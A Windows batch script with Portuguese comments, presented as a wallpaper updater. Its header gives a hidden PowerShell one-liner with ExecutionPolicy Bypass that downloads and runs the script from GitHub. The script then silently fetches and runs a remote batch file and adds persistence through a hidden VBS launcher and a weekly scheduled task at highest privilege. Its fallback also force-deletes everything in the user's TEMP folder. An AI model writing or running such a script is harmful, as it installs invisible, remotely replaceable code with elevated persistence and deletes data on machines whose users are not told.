@echo off
REM Script para atualizar papel de parede - Execução totalmente invisível
REM Executa via PowerShell do GitHub: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$repo='https://raw.githubusercontent.com/USER/REPO/main'; Invoke-WebRequest -Uri '$repo/starter.bat' -OutFile 'starter.bat'; $env:REPO_URL='$repo'; .\starter.bat"

REM ==========================================
REM CONFIGURAÇÕES
REM ==========================================
REM URL base do repositório (pode ser passada via variável de ambiente REPO_URL)
REM Se não for passada, tenta detectar ou usa fallback
if not defined REPO_URL (
    REM Tenta usar variável passada pelo PowerShell ou usa fallback padrão
    set "REPO_URL=https://raw.githubusercontent.com/mathaussobrinho/starter.bat/main"
)

set "SAVE_DIR=C:\ProgramData\TrulWallpaper"
set "BAT_FILE=%SAVE_DIR%\atualizar_wallpaper.bat"
set "VBS_FILE=%SAVE_DIR%\iniciar_invisivel.vbs"
set "TASK_NAME=TrulWallpaperUpdater"
set "BAT_URL=%REPO_URL%/atualizar_wallpaper.bat"

REM Cria pasta se não existir (silencioso)
if not exist "%SAVE_DIR%" mkdir "%SAVE_DIR%" >nul 2>&1

REM Baixa script principal (invisível)
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%BAT_FILE%' -UseBasicParsing -ErrorAction Stop | Out-Null } catch { }"

REM Se não conseguiu baixar, cria script local básico usando URL do mesmo repositório
if not exist "%BAT_FILE%" (
    (
        echo @echo off
        echo REM Script para atualizar papel de parede - Execução invisível
        echo set "CURRENT_DIR=%%~dp0"
        echo set "IMAGE_NAME=wallpaper.png"
        echo set "IMAGE_URL=%REPO_URL%/trul.png"
        echo powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%%IMAGE_URL%%' -OutFile '%%CURRENT_DIR%%%%IMAGE_NAME%%' -UseBasicParsing -ErrorAction SilentlyContinue"
        echo powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name wallpaper -Value '%%CURRENT_DIR%%%%IMAGE_NAME%%' -ErrorAction SilentlyContinue"
        echo powershell -WindowStyle Hidden -Command "Add-Type 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\", SetLastError=true)] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }'; [W]::SystemParametersInfo(20, 0, \"%%CURRENT_DIR%%%%IMAGE_NAME%%\", 0x01 -bor 0x02)"
        echo powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:APPDATA\Microsoft\Windows\Themes\TranscodedWallpaper\") {Remove-Item \"$env:APPDATA\Microsoft\Windows\Themes\TranscodedWallpaper\" -Force -ErrorAction SilentlyContinue}"
        echo powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:LOCALAPPDATA\Microsoft\Windows\Themes\CachedFiles\") {Get-ChildItem \"$env:LOCALAPPDATA\Microsoft\Windows\Themes\CachedFiles\" -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue}"
        echo powershell -WindowStyle Hidden -Command "Remove-Item \"$env:TEMP\*\" -Recurse -Force -ErrorAction SilentlyContinue"
        echo exit
    ) > "%BAT_FILE%"
) else (
    REM Se o arquivo foi baixado, atualiza a URL da imagem no arquivo baixado
    REM Substitui a URL padrão pela URL correta do repositório
    powershell -WindowStyle Hidden -Command "(Get-Content '%BAT_FILE%') -replace 'https://raw\.githubusercontent\.com/[^/]+/[^/]+/[^/]+/trul\.png', '%REPO_URL%/trul.png' | Set-Content '%BAT_FILE%'" >nul 2>&1
)

REM Cria script VBS para executar invisível com variável de ambiente
REM O VBS define a variável e executa via cmd.exe
(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo Set env = WshShell.Environment("Process"^)
    echo env("REPO_URL"^) = "%REPO_URL%"
    echo WshShell.Run "cmd.exe /c ""%BAT_FILE%""", 0, False
) > "%VBS_FILE%"

REM Verifica se a tarefa já existe
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    REM Tarefa já existe, não cria novamente
) else (
    REM Cria tarefa agendada para sexta-feira às 10:00
    schtasks /create /sc weekly /d FRI /tn "%TASK_NAME%" /tr "wscript.exe \"%VBS_FILE%\"" /st 10:00 /rl HIGHEST /f >nul 2>&1
)

REM Executa atualização agora (invisível)
wscript.exe "%VBS_FILE%" >nul 2>&1

REM Fecha silenciosamente
exit /b 0

